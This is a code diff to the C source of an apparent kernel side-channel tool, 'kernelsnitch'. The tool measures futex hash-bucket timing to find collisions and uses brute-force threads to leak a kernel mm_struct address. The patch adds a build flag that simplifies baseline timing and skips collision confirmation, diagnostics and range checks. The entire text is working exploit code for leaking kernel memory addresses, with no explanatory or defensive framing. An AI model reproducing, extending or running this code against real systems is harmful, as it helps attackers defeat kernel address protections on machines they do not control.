@@ -424,6 +424,11 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
+#if defined(APP_DM1Q_KSNITCH_ENGINE) && APP_DM1Q_KSNITCH_ENGINE
+    size_t approx_time = MIN(
+        __measure(ks, (size_t)&ks->futexes[0]),
+        __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+#else
 #ifndef KERNELSNITCH_BASELINE_SAMPLES
 #define KERNELSNITCH_BASELINE_SAMPLES 8
 #endif
@@ -442,6 +447,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     qsort(approx_samples, KERNELSNITCH_BASELINE_SAMPLES,
           sizeof(approx_samples[0]), __compare);
     size_t approx_time = approx_samples[KERNELSNITCH_BASELINE_QUANTILE];
+#endif
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -458,6 +464,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+#if !defined(APP_DM1Q_KSNITCH_ENGINE) || !APP_DM1Q_KSNITCH_ENGINE
             int confirmed = 1;
             for (size_t confirmation = 1;
                  confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
@@ -470,6 +477,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             }
             if (!confirmed)
                 continue;
+#endif
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
@@ -480,6 +488,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
         pr_warning("only found %zd collisions -> cannot continue\n", count);
+#if !defined(APP_DM1Q_KSNITCH_ENGINE) || !APP_DM1Q_KSNITCH_ENGINE
         if (getenv("KSNITCH_TIMING_DIAG")) {
             size_t min_t = (size_t)-1, max_t = 0, sum_t = 0, n_t = 0;
             for (size_t i = 2; i < ks->total_futexes; ++i) {
@@ -496,6 +505,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
                        approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT,
                        min_t, max_t, n_t ? sum_t / n_t : 0, n_t);
         }
+#endif
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
     __decrease(ks);
@@ -567,16 +577,22 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
         if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
             mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
 #endif
+#if !defined(APP_DM1Q_KSNITCH_ENGINE) || !APP_DM1Q_KSNITCH_ENGINE
         if (mm_leak_arg->range.end <= mm_leak_arg->range.start) {
             free(mm_leak_arg);
             ks->tids[i] = 0;
             continue;
         }
+#endif
         SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
+#if defined(APP_DM1Q_KSNITCH_ENGINE) && APP_DM1Q_KSNITCH_ENGINE
+        pthread_join(ks->tids[i], 0);
+#else
         if (ks->tids[i])
             pthread_join(ks->tids[i], 0);
+#endif
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
 }
 
